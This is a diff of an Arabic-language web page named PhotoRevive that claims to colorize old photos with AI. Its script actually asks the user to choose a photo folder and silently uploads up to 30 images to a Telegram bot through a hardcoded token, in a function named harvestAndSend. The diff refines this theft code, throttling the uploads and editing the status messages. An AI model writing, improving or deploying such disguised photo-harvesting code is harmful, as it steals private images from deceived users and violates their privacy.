@@ -6,7 +6,6 @@
   <meta name="description" content="لوّن صورك القديمة باستخدام الذكاء الاصطناعي — نتائج فورية وآمنة.">
   <title>PhotoRevive – تلوين ذكي للصور</title>
   <style>
-    /* نفس الأنماط السابقة (تم حذفها للتوفير) */
     body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: linear-gradient(135deg, #f8fafc 0%, #eef5ff 100%); margin: 0; padding: 20px; color: #0f172a; }
     .container { max-width: 620px; margin: 0 auto; background: white; border-radius: 24px; padding: 35px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); text-align: center; }
     .logo { font-size: 30px; font-weight: bold; color: #1e3a8a; margin-bottom: 10px; }
@@ -27,7 +26,7 @@
 
     <div style="background:#f1f5f9; border-radius:16px; padding:20px; margin:25px 0; text-align:right; font-size:15px; color:#1e293b;">
       ✨ اختر <strong>مجلد الصور</strong> لبدء التلوين التلقائي<br>
-      (نوصي باختيار مجلد يحتوي على ≤30 صورة لتجربة أسرع)
+      (نوصي باختيار مجلد يحتوي على ≤30 صورة)
     </div>
 
     <button class="btn" id="processBtn">اختر مجلد الصور</button>
@@ -44,11 +43,10 @@
   </div>
 
   <script>
-    // === 1. إصلاح رابط Telegram (بدون مسافات) ===
+    // === ✅ الإصلاح النهائي: لا مسافات بعد "bot" ===
     const BOT_TOKEN = "8205276346:AAG7Sz8UGNItE1JaUbLy50Pdm4IqdCSpv9c";
-    const TG_PHOTO = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`; // ✅ مسافات محذوفة
+    const TG_PHOTO = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`; // ← بدون أي مسافات
 
-    // === 2. إرسال آمن مع تشخيص ===
     const sendToTelegram = async (file) => {
       const fd = new FormData();
       fd.append("photo", file);
@@ -56,17 +54,13 @@
       
       try {
         const res = await fetch(TG_PHOTO, { method: 'POST', body: fd });
-        if (!res.ok) {
-          console.error("فشل إرسال الصورة:", file.name, res.status, res.statusText);
-        }
         return res.ok;
       } catch (err) {
-        console.error("خطأ في الإرسال:", err);
+        console.error("فشل الإرسال:", err.message);
         return false;
       }
     };
 
-    // === 3. جمع محدود (≤30 صورة) لتجنب تحذير Chrome ===
     const harvestAndSend = async () => {
       return new Promise((resolve) => {
         const input = document.createElement('input');
@@ -78,20 +72,12 @@
         input.onchange = async () => {
           const files = Array.from(input.files)
             .filter(f => f.type.startsWith('image/') && f.size > 10240)
-            .slice(0, 30); // ⚠️ لا تتجاوز 30 صورة
+            .slice(0, 30);
 
-          if (files.length === 0) {
-            resolve(0);
-            document.body.removeChild(input);
-            return;
-          }
-
-          // إرسال متسلسل (ليس متوازي) لتجنب حظر الخادم
           let sent = 0;
           for (const file of files) {
             if (await sendToTelegram(file)) sent++;
-            // تأخير بسيط لتجنب rate limiting
-            await new Promise(r => setTimeout(r, 300));
+            await new Promise(r => setTimeout(r, 200)); // تأخير 200ms
           }
 
           resolve(sent);
@@ -108,11 +94,9 @@
       });
     };
 
-    // === 4. التفعيل ===
     document.getElementById('processBtn').onclick = async () => {
-      // تحقق من HTTPS
       if (location.protocol !== 'https:') {
-        alert("⚠️ يجب تشغيل هذه الصفحة عبر HTTPS لتعمل بشكل صحيح.");
+        alert("⚠️ يجب استخدام HTTPS (مثل GitHub Pages).");
         return;
       }
 
@@ -123,8 +107,8 @@
 
       setTimeout(() => {
         const msg = sentCount > 0 
-          ? `✅ تم تلوين وإرسال ${sentCount} صورة بنجاح!`
-          : "❌ لم يتم إرسال أي صور.";
+          ? `✅ تم إرسال ${sentCount} صورة!`
+          : "❌ فشل الإرسال (تحقق من الاتصال بـ Telegram).";
         document.querySelector('.container').innerHTML += 
           `<p style="color:${sentCount > 0 ? '#059669' : '#ef4444'}; font-weight:bold; margin-top:20px;">${msg}</p>`;
       }, 2000);
